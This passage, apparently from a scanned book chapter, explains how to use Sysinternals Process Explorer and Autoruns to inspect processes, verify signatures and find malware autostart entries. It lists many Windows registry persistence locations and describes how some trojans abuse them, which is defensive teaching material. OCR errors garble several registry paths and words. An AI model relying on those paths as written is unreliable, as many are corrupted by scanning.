tions. From left to right, these toolbar functions are Save (a log), Refresh Now (F5), 
Refresh Screen, System Information, Show Process Tree (toggle), Hide Lower Pane, 
View Handles/DLL (toggle), Properties, Kill Process/Close Handle, Find (handle or 
DLL), and Find Window's Process (drag the toolbar button over the open Desktop 
window). 

52 
Chapter 2 9 Examining Your Computer 
Significant Toolbar Shortcut Functions 
Here is a quick review of some key toolbar functions: 
9 Refresh (FS) Refreshes the display. The display updates automatically 
every second. If you make a change and want to refresh the screen immedi- 
ately, you can press the F5 key or click the Refresh shortcut button. The 
refresh rate is set to one second by default, but you can change it from the 
main menu by selecting Options I Update Speed. 
9 
Find Window's Process Enables you tO identify the process associated 
with an open window on your desktop, by simply dragging the periscope- 
like toolbar symbol over the open window. Process Explorer will then 
identify the process that owns the window by highlighting it in the 
process tree. 
General Malware Symptoms 
Recognizable by Process Explorer 
I will address the topic of malware symptoms in detail in the section titled "The 
Dynamic Duo" Using Autoruns and Process Explorer Together to Troubleshoot 
Startups and Combat Malware." Here I will mention a few malware indicators that 
you may encounter when using Process Explorer. These indicators are not definite 
signs of an infection, but they do serve as an alert to indicate the need for further 
investigation. 
Packed Images 
Process Explorer will highlight in purple any processes that are packed executables. If 
you see an unknown process like this, you should immediately become suspicious. It 
doesn't necessarily mean that a process running as a packed executable is malicious 
in nature, but in most cases, it usually does warrant further investigation. For 
example, I have one process running which shows up in Process Explorer with 
packed attributes, as illustrated by the process highlighted in purple in Figure 2.8. 

Examining Your Computer 9 Chapter 2 
53 
Figure 2.8 Investigating a Packed Process: EditPad.exe 
When I inspect the image attributes in the Properties dialog box for the 
EditPad.exe process, Process Explorer indicates the signature has not been verified 
(see Figure 2.9). 
Figure 2.9 Properties for the EditPad.exe Packed Process 
When I click the Verify button, Process Explorer responds that it cannot verify 
the signature (see Figure 2.10). 

54 
Chapter 2 9 Examining Your Computer 
Figure 2.10 Unable to Verify Process Properties~lmage File Label 
I recognize EditPad.exe as the program I use as a Notepad replacement. Since I 
use it for nearly all my writing, and I know the program is running because I am 
currently using it, I am not concerned. In addition, the Publisher field in the Image 
dialog clearly states the program's source. Since an individual developer authored the 
program, I am also not surprised to see it is not verifiable. I consider the program 
trustworthy, so I decide that no further investigation is required. 
Another process is running under svchost.exe, called wuauclt.exe, which I 
choose to investigate even though there is no indication the process is packed or 
otherwise suspicious. I bring up the Process Properties dialog and select Image. I see 
that the company name is listed as Microsoft, but that it has not been verified (see 
Figure 2.11). 
Figure 2.11 Process Explorer Properties Dialog Showing Unverified Process, 
wuauclt.exe 

Examining Your Computer 9 Chapter 2 
55 
I would expect Microsoft to have a digitally signed certificate for the program, 
so I click Verify, and Process Explorer indicates the image is indeed a verifiable 
Microsoft process (see Figure 2.12). 
Figure 2.12 Process Explorer Properties Dialog Showing the wuauclt.exe 
Process Was Verified 
I know that wuauclt.exe is Microsoft's background process for Automatic 
Updates, so the results are not surprising to me. The Image File description even has 
Automatic Updates for its process description. 
The preceding example may have seemed obvious to you, but it is an important 
exercise nonetheless because some malware processes try to masquerade as Microsoft 
processes, and the Company Name field will indicate they are from Microsoft. 
However, if you attempt to verify these processes for authenticity in Process 
Explorer, you will not be able to do so.You should immediately become very suspi- 
cious if that happens. 
You can set Process Explorer to verify the signatures of all processes by clicking 
Options I Verify Signatures, but this will slow down the program significantly. 
Unless you suspect you are infected, it may be advantageous to target any processes 
worthy of further investigation individually, as illustrated earlier. 
You can spot suspect blank entries quite easily by examining the company name 
and/or description in the upper pane view.You can then open a Properties dialog 
and examine the images of these processes to see whether they have been verified. If 
they haven't, click the Verify button to allow Process Explorer to search for a verifi- 
able signature. Autoruns, the Sysinternals Startup Manager, has a Publisher column 
that you can check to ascertain immediately whether the signature has been verified. 
Frequently, malware processes will have a blank company name and description 
in their image properties. Sometimes they will have a rather lofty, official-sounding 
description, designed to make you less likely to stop and delete the process. A few 

56 
Chapter 2 9 Examining Your Computer 
malware processes have the arrogance to try to pawn themselves off as Microsoft 
executables. Usually it's easy to view the name of a service in Process Explorer's 
main screen (indicated by pink highlighting) by hovering your cursor over it.You 
also can view the service details in the Properties dialog, under Services.You can 
view services in Autoruns by clicking the Services tab, or by using the Microsoft 
Services Console. Since it's so easy to view service names, it is more common to see 
phony services mimic or use a name intended to thwart deletion attempts. Some 
examples of infected services with deceptive names that fall under this "you might 
crash your system if you dare to delete me" category are Adobe Update Manager, 
the .NET Framework Service, and DEVICEMAP. All of these are phony Trojan ser- 
vices with names that their writers selected to convey importance. However, service 
names and descriptions can also be blank or cryptic in nature. 
Many malware processes will copy DLL files into the Windows system folder. 
Those that install a service will often deposit a SYS or EXE file in the Windows 
system directory. By clicking the Services tab in the Properties dialog, you can see 
the location of the process associated with a running malware service. These services 
will have autostart entries in the Registry, which you can identify with Autoruns, the 
diagnostic program we will discuss next. 
Continued 

Examining Your Computer 9 Chapter 2 
57 
Explori ng Prog ra m 
Autostart Locations Using Autoruns 
Many of the programs installed on your computer are set to run automatically at 
system startup. These programs run in the background and usually will have no open 
windows on your desktop to indicate they are running, though some may insert an 
icon in the system tray.You can identify a program associated with a system tray icon 
by hovering your cursor over it. MSConfig is the system startup manager provided 
by Windows, but it does not show all the startup locations available, especially some 
of the hidden and more unusual ones that malware often exploits. 
Autoruns is a program by Sysinternals that shows a comprehensive listing of 
autostart locations on your computer, for all users. Autoruns can help you to identify 
all the programs that run in the background or that start automatically when your 
computer boots up. It will also show you the locations where these programs load 
and will allow you to disable these entries from the program. In most cases, this 
should prevent the programs from running at your next system restart. Autoruns will 
show a comprehensive list of all autostart locations and even include "Empty 
Sections" or those for which your system has no autostarts. The display listing reflects 
the actual order Windows uses to load startups. 

58 
Chapter 2 9 Examining Your Computer 
You should inspect your computer with Autoruns on a regular basis to verify that 
no malware startups have been installed, especially if your computer is behaving slug- 
gishly or erratically.You also can use Autoruns to disable nonessential "resource hog" 
startups that may be slowing down your computer. Later in this chapter, I address 
using Process Explorer and Autoruns to troubleshoot your system, and provide exam- 
ples of tracking down and disabling unnecessary programs and services (see "The 
Dynamic Duo" Using Autoruns and Process Explorer Together to Troubleshoot 
Startups and Combat Malware'). 
Figure 2.13 shows the main display of the Autoruns program, with the default 
settings engaged. 

Examining Your Computer 9 Chapter 2 
59 
Figure 2.13 The Autoruns Main Program View Using Default Settings 
Describing the Main Window View 
By default, Autoruns has the following three options turned off." Include Empty 
Sections, Verify Code Signatures, and Hide Signed Microsoft Entries. The Menu dis- 
play options also define what is included in the Autoruns log. To follow this discus- 
sion more easily, you should click Options and then turn on (check) the Include 
Empty Sections and Verify Code Signatures checkboxes. Then press the F5 key 
to refresh the screen. The signature verification requires Internet access, which you 
may have to approve for your firewall. 
The main Autoruns view lists all autostart locations in the order that Windows 
processes them. The beige highlighting indicates known autostart locations for which 
your system contains no entries (also called empty sections). As noted earlier, Autoruns 
normally does not display empty sections by default. The white highlighted sections 
identify the locations on your system that launch the autostart process. 
Figure 2.14 shows the same Autoruns snapshot as Figure 2.13, but with both the 
Include Empty Sections and the Verify Code Signatures checkboxes checked (instead 
of using the Autoruns default settings). 

60 
Chapter 2 9 Examining Your Computer 
Figure 2.14 Autoruns Main Program Display with Include Empty Sections 
and Verify Code Signatures Turned On 
What the Column Headers Mean 
The column headers describe the following attributes for each item listed in the 
Autoruns display: 
9 
Autorun Entry Identifies the name of the program that is autostarting. 
Each autostart program entry will be listed under the location from which 
it is launched. The location may be a Registry key, a startup folder, or a task 
folder. 
9 
Description Provides a very brief description of the program that is 
autostarting. This description is usually just a bit more detailed than the 
information provided in the Program Name field. 
9 
Publisher Tells you the entity or company that released the program. 
9 
Verified A label that is prefixed to the Publisher field of programs that 
Autoruns has determined have trusted digitally signed signatures. 
Ordinarily, Microsoft programs will bear the Verified label. 
9 
Unverified Means either the program has no signed digital signature or it 
has a certificate of authenticity signed by an untrusted source. 

Examining Your Computer 9 Chapter 2 
61 
Image Path Shows the location of the program that launches the 
autostart on your system. If the autostart is a system service, it is listed as 
svchost.exe and the location will be your Windows system directory. 
System services are often loaded in groups. A single instance of svchost can 
represent the autostart for many system services. 
Understanding the Display Feature Groupings 
The Autorun's display categorizes similar startups into groups that map to the fol- 
lowing tabs: 
Everything 
Selecting Everything causes the system to list all of the autostart locations known to 
Autoruns. 
Logon 
Selecting Logon causes Windows to display the autostarts WinLogon would trigger. 
Logon initiates an initialization sequence and causes your user profile settings to take 
effect. Logon is defined by this Autoruns entry: 
HKLM\ S O F TWARE \Microsoft \Windows NT \ CurrentVersion\Winlogon\ 
Userinit. In Windows, the value of this subkey defaults to C:\WINDOWS\ 
system3 2 \ us erini t. exe. 

62 
Chapter 2 9 Examining Your Computer 
Unfortunately, malware has exploited the flexibility that Microsoft built into 
Windows.The ABetterlnternet.Trojan downloader, also referred to as Aurora, uses 
this autostart method.Aurora appends its own infected executable, called nail.exe, 
into the value of the subkey, like so: C:\WINDOWS\system32\userinit.exe, nail.exe. 
Therefore, it is executed whenever Windows starts. A password-stealing Trojan called 
the Satiloler Trojan even uses userinit.exe as the name of its executable. 
Other logon entries represent the standard autostart locations for most applica- 
tion programs. This includes the Registry run keys corresponding to the global 
(HKLM) and local (HKCU) startups for the RunOnce, Run, and RunOnceEx 
Registry locations. It also includes startup folder locations for "all users" and for the 
current user. 
Malware often targets logon startup locations. Autoruns contains a comprehen- 
sive listing of startup locations that far exceeds those listed by the system configura- 
tion utility also known as MSConfig.You should get into the habit of checking your 
autostart locations with Autoruns on a regular basis. This way you will be able to 
monitor your computer for any new entries that have been added without your 
knowledge or permission. 
Now we will go over the tabs that Autoruns uses to organize the autostart loca- 
tions into manageable display groups. 
Explorer 
If you select the Explorer tab, Explorer shell extensions, browser helper objects, 
Explorer toolbars, active setup executions, and shell execute hooks will be displayed. 

Examining Your Computer 9 Chapter 2 
63 
ShellExecute Hooks 
If you select ShellF.xecute Hooks, you will see application DLL modules that are 
launched through Windows Explorer. They usually expand a program's functionality 
in a positive way. However, shell execute hooks may also be a launch point for mal- 
ware. 
Shell Extensions 
Selecting Shell Extensions displays shell extensions that allow an application pro- 
gram to add an entry into the context menu so that it becomes available when a file 
is right-clicked. 
Internet Explorer 
Selecting the Internet Explorer tab lists Browser Helper Objects (BHOs), Internet 
Explorer toolbars, and extensions. Browser Helper Objects and URL Search Hooks 
are Internet Explorer plug-ins that allow third-party applications to affect or define 
Internet Explorer's behavior. These plug-ins are DLL files. 
Services 
When you select the Services tab, any services autostarted by Windows or applica- 
tion programs will be listed. Services are loaded very early in the startup sequence, 
even before Windows starts. Device drivers are treated as services in Windows. 
Kernel-mode rootkits install drivers that are normally not visible to analysis pro- 
grams such as Autoruns.You can circumvent this so that even rootkit service 
autostarts and drivers are visible in Autoruns. 
Drivers 
Selecting the Drivers tab lists all registered kernel-mode drivers that are not disabled. 
The drivers need not be running to be listed. 
Scheduled Tasks 
If you select the Scheduled Tasks tab, tasks that the Task Scheduler has scheduled will 
be displayed.You can add tasks to the Task Scheduler by selecting Start I Control 
0 
0 
Panel [ Scheduled Tasks. Any tasks added this way reside in the ~Windir~\tasks 
folder. 
www.syngress.com 

64 
Chapter 2 9 Examining Your Computer 
Image Hijacks 
If you select Image Hijacks, hijacks that are started by the HKLM\System\ 
CurrentControlSet\Control\Session Manager\BootExecute key are displayed.You 
also can execute DOS scripts by using this startup. Process Explorer also uses this key 
when you elect to replace the Task Manager with Process Explorer. That would 
result in the addition of the HKEY_LOCAL_MACHINE\SOFTWARE\ 
Microsoft\Windows NT\CurrentVersion\Image File Execution 
Options\taskmgr.exe Registry subkey. 
Another legitimate Microsoft entry listed under Image Hijacks is: 
Symbolic Debugger for Windows 2000 (Verified) Microsoft Windows Publisher 
c:\windows\system32\ntsd.exe. 
Other Image Hijack Registry keys include the following: 
9 HKLM\Software\Microsoft\Command Processor\Autorun 
9 HKCU\Software\Microsoft\Command Processor\Autorun 
9 HKLM\SOFTWARE\Classes\Exefile\Shell\Open\Command\ 
Applnit DLLs 
If you select Applnit DLLs, Autoruns will list any registered DLLs that are loaded 
using the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ 
Windows\Applnit_Dlls Registry key. 
Some legitimate application programs use the Applnit_DLLs key. However, mal- 
ware has exploited this location because it provides an easy method of injecting a 
DLL into all user processes that link to user32.dll (which is nearly all of them). The 
original Windows MetaFile (WMF) hotfix developed by Ilfak Guilfanov prior to the 
release of the Windows patch used Applnit_DLLs injection. 
Boot Execute Native Images 
If you select Boot Execute Native Images, native images that execute very early in 
the boot process are listed. Such autostarts load via the HKLM\System\ 
CurrentControlSet\Control\Session Manager\BootExecute Registry key. 
Commands to be run at the next system boot-up use this key. The Windows 
default value for this key is autockeck autochk. A check disk to be run at the next 
system restart represents a task, which is executed through this key.You should inves- 
tigate any other entries! 

Examining Your Computer 9 Chapter 2 
65 
Known DLLs 
Known DLLs reports the location of DLL files that Windows loads into applications 
that reference them. For 32-bit DLLs, you can find the Known DLLs Registry key 
at HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls. If 
you have the Hide Signed Microsoft Entries box checked, you may not see any 
entries here. 
WinLogon Notifications 
If you select the Winlogon Notifications entry, you will see DLLs that have regis- 
tered to receive WinLogon notification of logon events. Applications can code a 
Winlogon Notification package to perform functions which are triggered by logon 
events such as logon, log off, shut down, and start screensaver, to name a few. 
Winsock Providers 
If you select Winsock Providers, Winsock Layered Service Providers (LSPs) and their 
associated DLL files will be displayed. Winsock is an abbreviated term for Windows 
sockets. It defines the protocol that Windows uses to access network services. 
Windows allows third-party applications to interface with their Winsock software, 
and these applications are called Winsock providers. Legitimate Winsock providers 
such as your antivirus software may have entries in this section. Malware sometimes 
installs itself as a Winsock provider because it makes the program more resistant to 
removal.You must be careful when removing a Winsock DLL, because doing so will 
often upset the Winsock stack, resulting in a loss of Internet connectivity. Therefore, 
you should try to uninstall any unwanted program which has insinuated itself into 
the Winsock chain by using the Control Panel's Add/Remove programs feature, or 
the provider's (or hijacker's) own uninstall program. 
LSA Providers 
If you select LSA Providers, registered Local Security Authority (LSA) providers will 
be listed. LSA is built into Windows XP and Windows 2000 to verify user creden- 
tials and assign a security context based upon the group to which the user belongs. 
Applications are available for monitoring security across networks, to make sure that 
both local and remote security access is maintained, and to ensure that sensitive data 
such as logins are transmitted in encrypted form. An example of a well-known LSA 
is Kerberos. 

66 
Chapter 2 9 Examining Your Computer 
Printer Monitor 
If you select Printer Monitor, a list of printer drivers will be displayed. These are 
low-level autostarts that use the 
HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors Registry key. 
This is an area that malware may try to target, but it is not a common one. 
Microsoft should be able to verify most printer drivers, and you should be able to 
recognize the manufacturer of any printers you have now or may have had. I have 
Microsoft Office Live Meeting and it inserts an entry here for its Document Writer 
support. 
Using the Autoruns Menu Functions 
The Autoruns menu provides the following functions: File, Entry, Options, User, and 
Help. I will now describe each of these functions individually.You can access the 
display feature controls from the Autoruns menu by clicking Options. By default, 
Autoruns has the following three options turned off." Include Empty Sections, Verify 
Code Signatures, and Hide Signed Microsoft Entries. For the sake of this discussion, 
you should turn on (check) Include Empty Sections and Verify Code 
Signatures. Then press the F5 key to refresh the screen. 
Options 
The first three Options menu selections directly affect the Autoruns display. The 
Include Empty Sections and Hide Signed Microsoft Entries options enable you to 
minimize the number of entries in the Autoruns display. The Verify Code Signatures 
option is a security feature that allows you to verify entries for signed digital signa- 
tures and should be used prior to selecting the Hide Signed Microsoft Entries 
option. 
9 
Include Empty Sections If you check this option, you will see all 
autostart locations, regardless of whether your system has any startups 
defined for these locations. 
9 
Verify Code Signatures If you check this option, Autoruns will attempt 
to verify all entries for digitally signed signature certification. Entries will 
then be labeled as verified or unverified in the Publisher column. 
9 
Hide Signed Microsoft Entries If you check this option, Microsoft 
entries that Autoruns has confirmed have an authentic digital signature will 
be excluded. This is advantageous to use to obtain a display that is more 

Examining Your Computer 9 Chapter 2 
67 
readable and easier to interpret. Only Microsoft entries with verified signa- 
tures will be excluded, so it is a safe option to check. 
Search Engine Autoruns uses Google by default to investigate any entries 
you may want to research online. Selecting this allows you to toggle 
between the MSN Search and the Google Search Engine options. 
User 
Autoruns can display autostart locations for any user account, but you can analyze 
only one user account at a time. Autoruns displays the autostarts associated with the 
account that started it, by default.You can select to display autostarts from another 
account by simply checking an alternate user account. 
File 
The File functions Compare and Save provide built-in security by allowing you to save 
an Autoruns log and do a cross-diff comparison between it and the current Autoruns 
scan entries. Find provides a search function, and Refresh updates the current display 
to reflect any changes that you may have made under the Options menu. 
9 
Compare Autoruns will compare the current display to any previous 
Autoruns log you have saved.You may select the Compare log by browsing 
to it. Any items that appear in the current display that do not have an 
equivalent entry in the saved log will appear in green. In other words, 
Autoruns highlights the differences in green. 
9 
Save and Save As Autoruns will save a log using the name and location 
you provide. The default log name is autoruns.txt and the default location is 
the Autoruns folder. On my system, these two functions behaved identically. 
9 
Find Autoruns allows you to specify a search term that it will try to locate 
in the current display. 
9 
Refresh The display will update to reflect any changes you made. The 
shortcut to this function is the F5 function key. 
9 
Exit The Autoruns program will terminate. 
Entry 
All functions controlled by the Entry function require an item to be selected (high- 
lighted) in the current display. The Entry options provide access to nearly all the 
features that make Autoruns such a powerful tool. All the following Entry menu 

68 
Chapter 2 9 Examining Your Computer 
options are also available from the context menu of a highlighted item, simply by 
right-clicking the highlighted entry: 
9 Delete If you select Delete, the highlighted entry is deleted and will no 
longer be able to be reactivated as autostart. To retain but deactivate an 
entry, just uncheck it in the display. 
9 
Copy If you select Copy, Autoruns copies the highlighted entry to the 
Windows clipboard and makes it available for pasting to a text editor or 
other application. The Copy command allows you to add the key to a 
Registry script for automated processing or removal. 
9 Verify If you select Verify, the highlighted entry will be verified for digital 
signature authenticity (this requires an active Internet connection). 
9 Jump To If you select Jump To, Autoruns.jumps to the location in the 
Registry or the Windows folder that is responsible for launching the high- 
lighted autostart. 
9 
Google If you select Google (or the selected search engine),Autoruns 
conducts a search on the highlighted entry. To save time, you can activate 
this function by double-clicking the highlighted entry. 
9 Process Explorer If you select Process Explorer, and Process Explorer is 
currently running, a Properties dialog opens in Process Explorer on the 
item in the image column of the highlighted item. 
9 Properties 
If you select Properties, Autoruns opens a Windows Property 
dialog on the file specified by the highlighted entry's image path. 
What's in the Autoruns Log 
Autoruns displays autostarts in the order that Windows processes them. It is common 
to make a distinction between the autostarts that are activated before and after 
Windows starts, which is called WinLogon. WinLogon is indicated by the following 
entry in the following Autoruns log: HKLM\SOFTWARE\Microsoft\ 
WindowsNT\CurrentVersion\Winlogon\Userinit. 
The Corresponding Registry/Folder startup locations listed here are generated 
in the Autoruns log if the Everything and Include Empty Sections options are 
checked. If an autostart is present in any of these locations it will be listed in the log 
under the key and will be prefixed with a plus sign (+). 
In one of the examples in the section tiffed "The Dynamic Duo: Using 
Autoruns and Process Explorer Together to Troubleshoot Startups and Combat 

Examining Your Computer 9 Chapter 2 
69 
Malware" I have included a log with actual autostarts listed, so that you can see how 
Autoruns presents the log results and how to interpret them. 
Registry and Folder Autostart 
Locations Monitored by Autoruns 
The following Registry and Folder autostart locations monitored by Autoruns are 
listed in the order in which they appear in the log: 
HKLM \ System\ CurrentC ontrolS et\ Control\ Terminal 
Server\Wds\rdpwd\StartupPrograms 
HKLM\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\AppSetup 
HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup 
HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logon 
HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logon 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
Winlogon\Userinit 
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ 
System\Shell 
HKCU\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Shell 
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\ 
System\Shell 
HKLM\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Shell 
HKLM\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Taskman 

70 
Chapter 2 ~ Examining Your Computer 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
TerminalServer\InstallSoftware\Microsoft\Windows\CurrentVersion\ 
Runonce 
HKLM \SO F TWARE \ Micros oft\WindowsNT \ CurrentVersion\ 
TerminalServer\Install\Software\Microsoft\Windows\CurrentVersion\ 
RunonceEx 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
TerminalServer\ Install\ Software\Microsoft\Windows\ CurrentVersion\Run 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
HKLM \SO F TWARE \Microsoft\Windows\ Cur rentVersion \ RunO nc eEx 
HKLM \ S O FTWARE \Mi croso ft \Win dows \ C urrentVersio n \Run Once 
C:\Documents and Settings\All Users\Start Menu\Programs\Startup 
C:\Documents and Settings\ <user name>\Start Menu\Programs\Startup 
HKCU\Software\Microsoft\WindowsNT\CurrentVersion\Windows\Load 
HKCU\ Software \ Microsoft\WindowsNT \ Cur rentVersio n\Windows \ Run 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ 
Explorer\Run 
HKCU \ S o ftware \Microsoft\Windows\ Cur rentVersion\Policies \Explorer\ 
Run 
HKCU \ Software \Microsoft\Windows\ C urrentVersion\ Run 
HKC U\ So ftware \Microsoft \Windows \ C urre ntVersio n \ Run Once 
HK C U\ S O F TWARE \Mi croso ft \ Win dowsNT \ C urren tVersi o n \ 
TerminalServer\Install\Software\Microsoft\Windows\CurrentVersion\ 
Runonce 
HK C U\ S O F TWAR_E \Mi croso ft \ Win dowsNT \ C urre n tVersi o n \ 
TerminalServer\Install\Software\Microsoft\Windows\CurrentVersion\ 
RunonceEx 
HKCU\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
TerminalServer\Install\Software\Microsoft\Windows\CurrentVersion\Run 
HKLM \ S O F TWARE \ Classes \Proto c ols \ Filter 
HKLM \ S O F TWARE \ Classes \Protocols \Handler 
HKLM\SOFTWARE\Microsoft\Active SetupkInstalled Components 

Examining Your Computer 9 Chapter 2 
HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ 
SharedTaskScheduler 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
ShellServiceObj ectDelayLoad 
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
ShellServiceObj ectDelayLoad 
HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ 
ShellExecuteHooks 
HKLM\Software\Microsoft\Windows\CurrentVersion\ShellExtensions\ 
Approved 
HKC U\ Software \Microsoft \ Windows \ Cur rentVersio n \ S hellExte nsions \ 
Approved 
HKLM \ Software \ Classes \ Folder\ Shell ex\ C olumnH andlers 
HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ 
B rows erH e lperO bj ects 
HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks 
HKLM\Software\Microsoft\Internet Explorer\Toolbar 
HKCU\Software\Microsoft\Internet Explorer\Explorer Bars 
HKLM\Software\Microsoft\Internet Explorer\Explorer Bars 
HKCU\Software\Microsoft\Internet Explorer\Extensions 
HKLM\Software\Microsoft\Internet Explorer\Extensions\ 
Task Scheduler 
HKLM\System\CurrentControlSet\Services 
HKLM\ System\ CurrentC ontrolS et\ Control\ S essionManager\B o otExecute 
HKLM\Software\Microsoft\Windows 
NT\CurrentVersion\ImageFileExecutionOptions 
HKLM\Software\Microsoft\Command Processor\Autorun 
HKCU\Software\Microsoft\Command Processor\Autorun 
HKLM \SO F TWARE \ Classes \Exefile \ Shell\ Open \ Command\ (Default) 
71 

72 
Chapter 2 9 Examining Your Computer 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
Windows\Appinit_Dlls 
HKLM\ System\CurrentControlSet\ Control\Session Manager\KnownDlls 
HKLM \ SO F TWARE \ Micro s oft \WindowsNT \ Cur rentVersio n \ 
Winlogon\System 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
Winlogon\UIHost 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
Winlogon\Notify 
HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ 
Winlogon\GinaDLL 
HKLM \ S O F TWAR_E \Microso ft \ Windows NT \ Cur re ntVe r si o n \ 
Winlogon\Taskman 
HKCU\Control Panel\Desktop\Scrnsave. exe 
HKLM \ System\ CurrentC ontrolS et\ C ontrol\B o o tVerificationProgram\ 
ImageName 
HKLM\ System\ C urrentC ontrolS et\ S ervic es \WinSo ck2 \Parameters\ 
Protocol_Catalog9 
HKLM\ SY STEM \ CurrentC ontrolS et\ Control\Print\Monitors 
HKLM\ SYSTEM\ CurrentControlS et\ Control\Lsa\ 
AuthenticationPackages 
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NotificationPackages 
HKLM\ SY STEM \ Current Controls et\ C ontrol\Lsa\ S ecurityPackages 
Newly Reported Startup Entry 
Slated for Next Version of Autoruns 
The next version of Autoruns will be able to detect the HKLM\SYSTEM\ 
CurrentControlSet\Control\SafeBoot\AlternateShell startup. At WinLogon, 
userinit.exe will inspect the HKLM\SYSTEM\CurrentControlSet\Control\ 
SafeBoot\Option\UseAlternateShell Registry key, to determine which program to 
launch. Normally, userinit launches explorer.exe as the default user shell. However, if 
the preceding Registry key is set to 1, userinit.exe runs the program specified as the 

Examining Your Computer 9 Chapter 2 
73 
alternate shell in the value of the HKLM\SYSTEM\CurrentControlSet\ 
Control\SafeBoot\AlternateSheH key instead. 
Researching an Autostart Item 
If you are unsure of the origin or trustworthiness of an autostart listed by Autoruns, 
you may investigate it by using one of the following five methods: 
1. Double-clicking its autostart entry and examining its launch point in the 
Registry or its startup folder on disk. 
2. Right-clicking an autostart entry and choosing Google to conduct an 
Internet search on the item noted in the Image column. 

74 
Chapter 2 9 Examining Your Computer 
3. Right-clicking an autostart entry and choosing Properties to open a 
Windows Properties dialog on the item noted in the Image column. 
4. Right-clicking an autostart entry and choosing Process Explorer to bring 
up a Process Explorer Properties dialog on the item noted in the Image 
column. 
. 
Comparing the current display against a saved log to see if the item is 
"new" or was included in a previous system snapshot by using the File I 
Compare option. 
The Dynamic Duo: 
Using Autoruns and Process Explorer 
Together to Troubleshoot Startups and 
Combat Malware 
Process Explorer and Autoruns are powerful, full-featured programs in their own 
right, but they synergistically complement one another when used together. This is 
definitely a case where the sum of the parts is greater than the whole. This is why I 
have branded them as The Dynamic Duo. 
Now that we have discussed the features available in Autoruns and Process 
Explorer, it is time to see how you can use them effectively to troubleshoot 
nonessential startups and combat malware. I am going to list some requirements for 
using Autoruns and Process Explorer in combination. This way you may follow 
along with some of the examples I present and get accustomed to using the pro- 
grams. The examples will increase in difficulty as we progress. 
Requirements 
The following list of the items will help you follow along with the examples that are 
presented in this section: 
9 Active Internet connection to perform searches 
9 Both Autoruns and Process Explorer open 
9 
Separate browser windows open to two startup databases 
9 
The Bleeping Computer startup database 
(www. ble epingc omp uter. com/star tup s) 
9 
The CastleCops startup list (www.castlecops.com/StartupList.html) 

Examining Your Computer 9 Chapter 2 
75 
9 
A text file containing links to the relevant research databases 
The Bleeping Computer startup database contains links to research databases, 
which we will use to investigate startups and processes in our troubleshooting exam- 
pies. This file is also posted at the Syngress Web site under the filename 
Researchdb.doc. I have posted the database links here as well so that we may refer to 
them as we work through the troubleshooting examples. 
Investigating Autoruns Startups 
Autoruns shows the programs that automatically start every time you boot your 
computer. In this section, we will use both Process Explorer and Autoruns to address 
both unnecessary and unwanted programs and startups. 
First, we will look for startups in Autoruns that arouse our suspicion. I will use 
my computer for this experiment. So that we can make the Autoruns display more 
readable we will set the display options by clicking the following options on the 
Autoruns menu: 
9 
Include Empty Sections Uncheck (OFF). 
9 
Verify Code Signatures Check (ON). 
9 
Hide Signed Microsoft Entries Check (ON). 
Now refresh the screen by pressing the F5 key or selecting File I Refresh. This 
will reduce the number of items in the display so that we can concentrate on any 
items that spark our interest. 
Example 1 
The first entry that arouses my curiosity is a Microsoft item that we could not 
verify. This is evident because in the Publisher column, "Microsoft Corporation" is 
prefixed with "(Not Verified)." It is unusual that a valid Microsoft file would return 
an unverified result. (Recall that we have turned on the Verify Code Signatures 
option.) 

76 
Chapter 2 9 Examining Your Computer 
The entry is a protocol handler with a Registry location that a number of CWS 
browser hijackers are known to exploit, so I know it has been and can be used as a 
malware target. In addition, I see the filename is composed mainly of random conso- 
nants, which also raises my hackles. I know many malware culprits use random 
naming to prevent their files from being entered into research databases and to make 
writing a standard fix for their specific infection more difficult. Vundo, CWS, and 
the Apropos rootkit are all known for using random naming techniques. 
This exercise will not only provide you with troubleshooting suggestions, but it 
will also teach you how to resolve the screen display entries to their equivalent 
output in the Autoruns log. If an autostart location is not empty, the value for that 
entry will be preceded by a + in the Autoruns log. This is the Autoruns log entry for 
the item we are concerned with, which I divided here to match the columns on the 
screen display and labeled to make them easier to decipher" 
9 Registry Location HKLM\SOFTWAR~\Classes\ 
Protocols \Handler\ cdo 
9 
Description Microsoft SharePoint Portal Server Object Model 
9 
Publisher (Not Verified) Microsoft Corporation 
9 Image Path C'\program files\common files\microsoft shared\web 
folders\pkmcdo.dll 
Next, I look at the Image Path column to determine the path and name of the 
file in question, which is C:\program files\common files\microsoft shared\web 
folders\pkmcdo.dll. Now, we have four options to choose from in our basic trou- 
bleshooting methodology: Query Process Explorer, Google, search a database, and 
Search your computer for the file in all of its locations. Here is a description of each: 
9 Query Process Explorer Right-click the entry and select Process 
Explorer to get additional information by inspecting its Process Explorer 
Properties dialog. Remember, the Process Explorer Properties dialog con- 
tains access to much more information than the Windows Properties 
